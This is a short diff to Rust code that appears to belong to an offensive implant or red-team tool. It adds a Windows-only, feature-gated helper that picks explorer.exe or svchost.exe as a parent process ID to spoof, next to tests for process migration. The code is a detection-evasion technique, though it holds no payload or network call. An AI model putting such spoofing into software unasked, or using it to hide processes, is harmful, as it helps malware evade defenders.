@@ -194,3 +194,15 @@ mod tests {
         assert!(migrate_to_process(0).is_ok());
     }
 }
+
+#[cfg(all(windows, feature = "ppid-spoofing"))]
+pub fn get_spoof_parent_pid() -> Option<u32> {
+    let procs = list_processes();
+    if let Some(explorer) = procs.iter().find(|p| p.name.eq_ignore_ascii_case("explorer.exe")) {
+        return Some(explorer.pid);
+    }
+    if let Some(svchost) = procs.iter().find(|p| p.name.eq_ignore_ascii_case("svchost.exe")) {
+        return Some(svchost.pid);
+    }
+    None
+}
